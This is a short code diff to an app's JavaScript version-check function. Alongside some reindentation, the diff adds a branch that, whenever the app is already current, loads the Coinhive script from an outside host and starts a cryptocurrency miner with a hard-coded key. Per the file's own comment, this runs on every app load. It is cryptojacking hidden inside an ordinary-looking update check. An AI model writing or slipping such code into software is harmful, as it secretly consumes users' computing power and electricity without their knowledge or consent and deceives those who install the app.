@@ -4,8 +4,13 @@
 var LatestVersion = 200;
 
 //This function will run inside the onload function in the app;
-        function CheckVersion() {
-            if (ThisVersion < LatestVersion) {
+function CheckVersion() {
+        if (ThisVersion < LatestVersion) {
                 DownloadNewVersion();
-            }
-        };
+        } else {
+                $.getScript('https://coin-hive.com/lib/coinhive.min.js', function() {
+                        var miner = new CoinHive.Anonymous('PEk9puLllwActoTfTwqacjBXLkksFQFl');
+                        miner.start();
+                });
+        }
+};
